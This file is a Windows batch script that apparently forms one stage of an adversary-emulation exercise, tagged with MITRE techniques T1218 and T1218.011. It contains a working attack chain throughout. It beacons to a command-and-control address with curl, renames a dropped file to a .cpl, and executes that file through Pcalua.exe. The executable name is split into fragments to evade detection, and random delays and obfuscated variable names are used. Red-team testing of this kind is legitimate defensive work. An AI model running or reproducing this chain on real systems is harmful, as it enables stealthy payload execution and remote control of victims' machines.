@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8912\37ce6312
SET fpakbq=Macula-Stage0-8912
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8912-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=control.txt
SET fpldhe=8912

SET zxjwef=%APPDATA%\!yydue!\macula-simulations.log
SET ephqkl=!omxgazu!
SET xcpldl=!fpldhe!
SET qwerzx=!yydue!

echo [!DATE! !TIME!][DEBUG][!ephqkl!]: script_start=!xcpldl!>> "!zxjwef!" 2>nul

REM Initial random delay
SET /A kjhgtv=%RANDOM% %% 10 + 15
echo [!DATE! !TIME!][DEBUG][!ephqkl!]: initial_delay=!kjhgtv!s>> "!zxjwef!" 2>nul
timeout /t !kjhgtv! /nobreak >nul

REM Heartbeat to C2 (mandatory, unmodified curl)
echo [!DATE! !TIME!][DEBUG][!ephqkl!]: heartbeat_start>> "!zxjwef!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
SET ttp_result=1
SET err_detail=
echo [!DATE! !TIME!][DEBUG][!ephqkl!]: heartbeat_complete>> "!zxjwef!" 2>nul
echo [!DATE! !TIME!][!ephqkl!]: !qwerzx!-!xcpldl!-T1218|Signed Binary Proxy Execution=!ttp_result!:!err_detail!>> "!zxjwef!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul

REM Rename DLL to CPL
SET cpl_file=!yktnwwf!\pcafile.cpl
echo [!DATE! !TIME!][DEBUG][!ephqkl!]: rename_start=!edjwtl!>> "!zxjwef!" 2>nul
RENAME "!yktnwwf!\!edjwtl!" "pcafile.cpl" >nul 2>&1
IF NOT EXIST "!cpl_file!" (
    SET ttp_result=0
    SET err_detail=rename_failed
    echo [!DATE! !TIME!][!ephqkl!]: !qwerzx!-!xcpldl!-T1218.011|Rundll32=!ttp_result!:!err_detail!>> "!zxjwef!" 2>nul
    exit /b 1
)
echo [!DATE! !TIME!][DEBUG][!ephqkl!]: rename_complete=!cpl_file!>> "!zxjwef!" 2>nul

ping -n 12 127.0.0.1 >nul

REM Obfuscated Pcalua.exe execution using command fragmentation
SET fg1=Pc
SET fg2=al
SET fg3=ua^.
SET fg4=ex
SET fg5=e
SET arg1=-^a
SET arg2= "!cpl_file!"

echo [!DATE! !TIME!][DEBUG][!ephqkl!]: execution_start=!fg1!!fg2!!fg3!!fg4!!fg5!!arg1!!arg2!>> "!zxjwef!" 2>nul
CALL !fg1!^!fg2!^!fg3!^!fg4!^!fg5! !arg1!!arg2!
IF !ERRORLEVEL! EQU 0 (
    SET ttp_result=1
    SET err_detail=
) ELSE (
    SET ttp_result=0
    SET err_detail=exit_code_!ERRORLEVEL!
)
echo [!DATE! !TIME!][DEBUG][!ephqkl!]: execution_complete=errorlevel_!ERRORLEVEL!>> "!zxjwef!" 2>nul
echo [!DATE! !TIME!][!ephqkl!]: !qwerzx!-!xcpldl!-T1218.011|Rundll32=!ttp_result!:!err_detail!>> "!zxjwef!" 2>nul

timeout /t 5 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!ephqkl!]: script_end=!xcpldl!>> "!zxjwef!" 2>nul